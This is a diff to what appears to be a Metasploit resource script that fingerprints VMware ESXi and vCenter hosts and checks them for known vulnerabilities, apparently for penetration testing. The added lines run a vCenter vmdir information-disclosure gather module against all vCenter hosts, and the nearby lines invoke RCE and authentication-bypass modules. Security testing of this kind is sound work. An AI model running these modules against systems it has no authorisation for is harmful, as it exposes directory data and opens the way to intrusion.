@@ -203,7 +203,7 @@ run
 sleep 5
 
 spool /root/output/msf/vmware.txt
-echo "####VM#####"
+echo "####VMware#####"
 
 echo "esx_fingerprint - VMware ESX_ESXi Version Info via web API"
 use auxiliary/scanner/vmware/esx_fingerprint
@@ -215,6 +215,12 @@ echo "VMware vCenter Server Virtual SAN Health Check Plugin RCE"
 use exploit/linux/http/vmware_vcenter_vsan_health_rce
 hosts -S vCenter -R
 check
+sleep 5
+
+echo "VMware vCenter Server vmdir Information Disclosure"
+use auxiliary/gather/vmware_vcenter_vmdir_ldap
+hosts -S vCenter -R
+run
 sleep 5
 
 echo "VMware vCenter Server vmdir Authentication Bypass"
